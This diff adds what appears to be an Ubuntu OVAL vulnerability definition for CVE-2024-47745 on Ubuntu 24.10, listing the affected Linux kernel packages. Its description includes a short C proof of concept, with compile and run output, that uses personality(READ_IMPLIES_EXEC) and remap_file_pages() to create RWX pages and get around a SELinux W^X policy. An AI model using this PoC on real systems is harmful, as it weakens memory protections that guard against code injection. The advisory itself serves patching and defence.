@@ -1,0 +1,66 @@
+{
+	"class": "vulnerability",
+	"id": "oval:com.ubuntu.oracular:def:2024477450000000",
+	"version": "1",
+	"metadata": {
+		"title": "CVE-2024-47745 on Ubuntu 24.10 (oracular) - medium",
+		"description": "In the Linux kernel, the following vulnerability has been resolved:mm: call the security_mmap_file() LSM hook in remap_file_pages()The remap_file_pages syscall handler calls do_mmap() directly, whichdoesn't contain the LSM security check. And if the process has calledpersonality(READ_IMPLIES_EXEC) before and remap_file_pages() is called forRW pages, this will actually result in remapping the pages to RWX,bypassing a W^X policy enforced by SELinux.So we should check prot by security_mmap_file LSM hook in theremap_file_pages syscall handler before do_mmap() is called. Otherwise, itpotentially permits an attacker to bypass a W^X policy enforced bySELinux.The bypass is similar to CVE-2016-10044, which bypass the same thing viaAIO and can be found in [1].The PoC:$ cat > test.cint main(void) {\tsize_t pagesz = sysconf(_SC_PAGE_SIZE);\tint mfd = syscall(SYS_memfd_create, \"test\", 0);\tconst char *buf = mmap(NULL, 4 * pagesz, PROT_READ | PROT_WRITE,\t\tMAP_SHARED, mfd, 0);\tunsigned int old = syscall(SYS_personality, 0xffffffff);\tsyscall(SYS_personality, READ_IMPLIES_EXEC | old);\tsyscall(SYS_remap_file_pages, buf, pagesz, 0, 2, 0);\tsyscall(SYS_personality, old);\t// show the RWX page exists even if W^X policy is enforced\tint fd = open(\"/proc/self/maps\", O_RDONLY);\tunsigned char buf2[1024];\twhile (1) {\t\tint ret = read(fd, buf2, 1024);\t\tif (ret <= 0) break;\t\twrite(1, buf2, ret);\t}\tclose(fd);}$ gcc test.c -o test$ ./test | grep rwx7f1836c34000-7f1836c35000 rwxs 00002000 00:01 2050 /memfd:test (deleted)[PM: subject line tweaks]",
+		"affected": {
+			"family": "unix",
+			"platform": "Ubuntu 24.10"
+		},
+		"reference": {
+			"source": "CVE",
+			"ref_id": "CVE-2024-47745",
+			"ref_url": "https://www.cve.org/CVERecord?id=CVE-2024-47745"
+		},
+		"advisory": {
+			"severity": "Medium",
+			"rights": "Copyright (C) 2024 Canonical Ltd.",
+			"public_date": "2024-10-22",
+			"cve": {
+				"text": "CVE-2024-47745",
+				"href": "https://ubuntu.com/security/CVE-2024-47745",
+				"public": "20241022"
+			}
+		}
+	},
+	"notes": {},
+	"criteria": {
+		"criterias": [
+			{
+				"operator": "OR",
+				"criterions": [
+					{
+						"test_ref": "oval:com.ubuntu.oracular:tst:201245420000000",
+						"comment": "linux package in oracular is affected and may need fixing."
+					},
+					{
+						"test_ref": "oval:com.ubuntu.oracular:tst:201245420000010",
+						"comment": "linux-aws package in oracular is affected and may need fixing."
+					},
+					{
+						"test_ref": "oval:com.ubuntu.oracular:tst:201245420000020",
+						"comment": "linux-azure package in oracular is affected and may need fixing."
+					},
+					{
+						"test_ref": "oval:com.ubuntu.oracular:tst:201245420000030",
+						"comment": "linux-gcp package in oracular is affected and may need fixing."
+					},
+					{
+						"test_ref": "oval:com.ubuntu.oracular:tst:201245420000060",
+						"comment": "linux-lowlatency package in oracular is affected and may need fixing."
+					},
+					{
+						"test_ref": "oval:com.ubuntu.oracular:tst:201245420000040",
+						"comment": "linux-oracle package in oracular is affected and may need fixing."
+					},
+					{
+						"test_ref": "oval:com.ubuntu.oracular:tst:201245420000050",
+						"comment": "linux-raspi package in oracular is affected and may need fixing."
+					}
+				]
+			}
+		]
+	}
+}
